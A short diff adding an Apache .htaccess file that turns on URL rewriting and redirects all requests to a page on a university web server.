@@ -1,0 +1,4 @@
+Options +FollowSymlinks
+RewriteEngine on
+RewriteRule ^(.*)$ http://ruth.upd.edu.ph/systemone [R,NC]
+
